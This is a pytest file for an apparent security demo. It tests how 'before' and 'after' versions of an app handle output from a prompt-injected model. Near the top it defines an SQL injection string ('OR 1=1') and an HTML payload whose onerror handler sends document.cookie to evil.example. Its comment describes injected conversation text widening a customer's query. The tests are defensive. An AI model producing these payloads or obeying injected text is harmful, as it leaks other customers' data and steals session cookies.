"""What a prompt-injected model returns, and what each version does with it."""

import sqlite3
from pathlib import Path

import pytest

DEMO = Path(__file__).parents[1]

# Customer C-1 asked about their orders; injected text in the conversation widened the query.
INJECTED_SQL = "SELECT * FROM orders WHERE customer_id = 'C-1' OR 1=1"
INJECTED_HTML = "Your order shipped.<img src=x onerror=\"fetch('https://evil.example/?c='+document.cookie)\">"


def fresh_db():
    db = sqlite3.connect(":memory:")
    db.execute("CREATE TABLE orders (id TEXT, customer_id TEXT, status TEXT, total REAL)")
    db.executemany("INSERT INTO orders VALUES (?,?,?,?)", [("O-1", "C-1", "shipped", 40.0), ("O-2", "C-2", "open", 12.5)])
    return db


def test_before_injected_output_leaks_other_customers_and_ships_a_script(load):
    before = load(DEMO / "before" / "app.py", "before_app")
    page = before.answer(fresh_db(), INJECTED_SQL, INJECTED_HTML)
    assert "2 rows" in page  # C-2's order came back to C-1
    assert "onerror=" in page


def test_after_the_model_cannot_write_sql(load):
    after = load(DEMO / "after" / "app.py", "after_app")
    db = fresh_db()
    with pytest.raises(after.Rejected):
        after.answer(db, {"query": "raw", "arg": INJECTED_SQL}, "x")
    with pytest.raises(after.Rejected):
        after.answer(db, {"query": "orders_for_customer", "arg": "C-1' OR 1=1"}, "x")


def test_after_html_is_escaped_and_the_good_path_works(load):
    after = load(DEMO / "after" / "app.py", "after_app")
    db = fresh_db()
    page = after.answer(db, {"query": "orders_for_customer", "arg": "C-1"}, INJECTED_HTML)
    assert "<img" not in page and "&lt;img" in page
    assert "1 rows" in page
